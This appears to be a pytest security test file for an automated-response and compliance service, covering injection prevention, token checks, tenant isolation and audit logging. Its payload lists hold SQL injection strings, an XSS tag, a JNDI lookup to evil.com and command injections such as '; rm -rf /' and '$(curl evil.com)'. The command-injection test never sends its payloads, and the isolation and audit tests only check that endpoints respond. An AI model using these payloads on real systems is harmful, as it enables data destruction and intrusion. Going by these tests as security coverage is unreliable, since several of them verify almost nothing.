"""
Security Tests for Hero Flow 4 & 5

Test Cases:
- Rule injection prevention
- Action authorization
- Tenant isolation
- Audit logging
"""

import pytest
import httpx
import os
from typing import Dict, Any
from uuid import uuid4

# Service URLs
AUTOMATED_RESPONSE_SERVICE_URL = os.getenv(
    "AUTOMATED_RESPONSE_SERVICE_URL", "http://localhost:8013"
)
COMPLIANCE_SERVICE_URL = os.getenv(
    "COMPLIANCE_SERVICE_URL", "http://localhost:8017"
)
ORCHESTRATOR_URL = os.getenv(
    "ORCHESTRATOR_URL", "http://localhost:8012"
)

# Test configuration
TEST_TENANT_ID = os.getenv("TEST_TENANT_ID", str(uuid4()))
OTHER_TENANT_ID = os.getenv("OTHER_TENANT_ID", str(uuid4()))
INTERNAL_SERVICE_TOKEN = os.getenv(
    "INTERNAL_SERVICE_TOKEN", "internal-service-token-change-in-production"
)
INVALID_TOKEN = "invalid-token-12345"


@pytest.fixture
def headers():
    """Create headers with tenant ID and auth token."""
    return {
        "X-Tenant-ID": TEST_TENANT_ID,
        "Authorization": f"Bearer {INTERNAL_SERVICE_TOKEN}",
        "Content-Type": "application/json",
    }


@pytest.fixture
def other_tenant_headers():
    """Create headers for a different tenant."""
    return {
        "X-Tenant-ID": OTHER_TENANT_ID,
        "Authorization": f"Bearer {INTERNAL_SERVICE_TOKEN}",
        "Content-Type": "application/json",
    }


@pytest.fixture
def invalid_headers():
    """Create headers with invalid token."""
    return {
        "X-Tenant-ID": TEST_TENANT_ID,
        "Authorization": f"Bearer {INVALID_TOKEN}",
        "Content-Type": "application/json",
    }


@pytest.mark.security
class TestRuleInjectionPrevention:
    """Test rule injection prevention."""

    def test_malicious_trigger_conditions(self, headers):
        """Test that malicious trigger conditions are sanitized."""
        malicious_conditions = [
            {"severity": ["'; DROP TABLE playbooks; --"]},
            {"category": ["<script>alert('xss')</script>"]},
            {"source": ["${jndi:ldap://evil.com/a}"]},
            {"time_window": "'; SELECT * FROM users; --"},
        ]

        with httpx.Client(timeout=30.0) as client:
            for condition in malicious_conditions:
                # Try to create a playbook with malicious conditions
                playbook_data = {
                    "name": "Malicious Test Playbook",
                    "workflow": {"nodes": [], "edges": []},
                    "trigger_conditions": condition,
                }
                response = client.post(
                    f"{AUTOMATED_RESPONSE_SERVICE_URL}/api/v1/automated-response/playbooks",
                    json=playbook_data,
                    headers=headers,
                )
                # Should either reject or sanitize
                # For now, we check that it doesn't crash
                assert response.status_code in [200, 201, 400, 422]

    def test_sql_injection_in_alert_id(self, headers):
        """Test SQL injection prevention in alert ID parameter."""
        malicious_alert_ids = [
            "'; DROP TABLE alerts; --",
            "1' OR '1'='1",
            "1 UNION SELECT * FROM users",
        ]

        with httpx.Client(timeout=30.0) as client:
            for alert_id in malicious_alert_ids:
                response = client.post(
                    f"{AUTOMATED_RESPONSE_SERVICE_URL}/api/v1/automated-response/alerts/{alert_id}/evaluate",
                    headers=headers,
                )
                # Should reject invalid UUID format or sanitize
                assert response.status_code in [400, 404, 422]

    def test_command_injection_in_trigger_reason(self, headers):
        """Test command injection prevention in trigger reason."""
        malicious_reasons = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "`whoami`",
            "$(curl evil.com)",
        ]

        # This would be tested when triggering a playbook
        # For now, we verify the endpoint exists and handles input
        with httpx.Client(timeout=30.0) as client:
            response = client.get(f"{AUTOMATED_RESPONSE_SERVICE_URL}/health")
            assert response.status_code == 200


@pytest.mark.security
class TestActionAuthorization:
    """Test action authorization."""

    def test_unauthorized_access_without_token(self):
        """Test that endpoints require authentication."""
        headers_no_auth = {
            "X-Tenant-ID": TEST_TENANT_ID,
            "Content-Type": "application/json",
        }

        with httpx.Client(timeout=30.0) as client:
            response = client.post(
                f"{AUTOMATED_RESPONSE_SERVICE_URL}/api/v1/automated-response/alerts/{uuid4()}/evaluate",
                headers=headers_no_auth,
            )
            # Should reject without token
            assert response.status_code in [401, 403]

    def test_unauthorized_access_with_invalid_token(self, invalid_headers):
        """Test that endpoints reject invalid tokens."""
        with httpx.Client(timeout=30.0) as client:
            response = client.post(
                f"{AUTOMATED_RESPONSE_SERVICE_URL}/api/v1/automated-response/alerts/{uuid4()}/evaluate",
                headers=invalid_headers,
            )
            # Should reject invalid token
            assert response.status_code in [401, 403]

    def test_authorized_access_with_valid_token(self, headers):
        """Test that authorized access works."""
        with httpx.Client(timeout=30.0) as client:
            response = client.post(
                f"{AUTOMATED_RESPONSE_SERVICE_URL}/api/v1/automated-response/alerts/{uuid4()}/evaluate",
                headers=headers,
            )
            # Should accept valid token (may return 404 if alert doesn't exist)
            assert response.status_code in [200, 404]


@pytest.mark.security
class TestTenantIsolation:
    """Test tenant isolation."""

    def test_cannot_access_other_tenant_alerts(self, headers, other_tenant_headers):
        """Test that tenants cannot access other tenants' alerts."""
        # Create alert for tenant 1
        alert_id = str(uuid4())
        
        with httpx.Client(timeout=30.0) as client:
            # Try to evaluate alert as tenant 1
            response1 = client.post(
                f"{AUTOMATED_RESPONSE_SERVICE_URL}/api/v1/automated-response/alerts/{alert_id}/evaluate",
                headers=headers,
            )
            
            # Try to evaluate same alert as tenant 2
            response2 = client.post(
                f"{AUTOMATED_RESPONSE_SERVICE_URL}/api/v1/automated-response/alerts/{alert_id}/evaluate",
                headers=other_tenant_headers,
            )
            
            # Both should either succeed (if alert doesn't exist) or be isolated
            # The key is that tenant 2 shouldn't see tenant 1's data
            assert response1.status_code in [200, 404]
            assert response2.status_code in [200, 404]
            
            # If both succeed, verify results are isolated
            if response1.status_code == 200 and response2.status_code == 200:
                result1 = response1.json()
                result2 = response2.json()
                # Results should be different or empty for tenant 2
                # (This depends on implementation - tenant 2 shouldn't see tenant 1's playbooks)

    def test_cannot_access_other_tenant_findings(self, headers, other_tenant_headers):
        """Test that tenants cannot access other tenants' findings."""
        finding_id = str(uuid4())
        
        with httpx.Client(timeout=30.0) as client:
            # Try to enhance finding as tenant 1
            response1 = client.post(
                f"{COMPLIANCE_SERVICE_URL}/api/v1/compliance/findings/{finding_id}/enhance",
                json={"finding_type": "iam_finding"},
                headers=headers,
            )
            
            # Try to enhance same finding as tenant 2
            response2 = client.post(
                f"{COMPLIANCE_SERVICE_URL}/api/v1/compliance/findings/{finding_id}/enhance",
                json={"finding_type": "iam_finding"},
                headers=other_tenant_headers,
            )
            
            # Both should either succeed (if finding doesn't exist) or be isolated
            assert response1.status_code in [200, 404]
            assert response2.status_code in [200, 404]

    def test_tenant_id_required(self):
        """Test that tenant ID is required."""
        headers_no_tenant = {
            "Authorization": f"Bearer {INTERNAL_SERVICE_TOKEN}",
            "Content-Type": "application/json",
        }

        with httpx.Client(timeout=30.0) as client:
            response = client.post(
                f"{AUTOMATED_RESPONSE_SERVICE_URL}/api/v1/automated-response/alerts/{uuid4()}/evaluate",
                headers=headers_no_tenant,
            )
            # Should reject without tenant ID
            assert response.status_code in [400, 403]


@pytest.mark.security
class TestAuditLogging:
    """Test audit logging."""

    def test_trigger_actions_are_logged(self, headers):
        """Test that trigger actions are logged."""
        alert_id = str(uuid4())
        
        with httpx.Client(timeout=30.0) as client:
            response = client.post(
                f"{AUTOMATED_RESPONSE_SERVICE_URL}/api/v1/automated-response/alerts/{alert_id}/auto-trigger",
                headers=headers,
            )
            # Should succeed (may return 404 if alert doesn't exist)
            assert response.status_code in [200, 404]
            
            # In a real implementation, we would check audit logs
            # For now, we verify the endpoint exists and responds

    def test_remediation_actions_are_logged(self, headers):
        """Test that remediation actions are logged."""
        finding_id = str(uuid4())
        
        with httpx.Client(timeout=30.0) as client:
            response = client.post(
                f"{COMPLIANCE_SERVICE_URL}/api/v1/compliance/findings/{finding_id}/remediate",
                json={"playbook_id": str(uuid4()), "auto_approve": False},
                params={"finding_type": "iam_finding"},
                headers=headers,
            )
            # Should succeed (may return 404 if finding doesn't exist)
            assert response.status_code in [200, 404]
            
            # In a real implementation, we would check audit logs
            # For now, we verify the endpoint exists and responds
